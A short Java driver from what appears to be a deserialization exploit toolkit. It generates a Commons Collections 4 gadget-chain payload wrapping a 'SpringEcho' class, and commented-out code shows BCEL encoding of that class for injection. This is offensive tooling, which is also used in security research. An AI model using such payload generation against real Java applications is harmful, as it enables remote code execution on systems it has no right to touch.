package com.example.springecho.search;

import com.example.springecho.gadget.SpringEcho;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class Search {
    public static void main(String[] args) throws Exception{
        CC4Generator cc4Generator = new CC4Generator();
        cc4Generator.make(SpringEcho.class);

//        JavaClass javaClass = Repository.lookupClass(SpringEcho.class);
//        String s = Utility.encode(javaClass.getBytes(), true);
//        String bcelStr = "$$BCEL$$" + s;
//        System.out.println(bcelStr);
    }
}
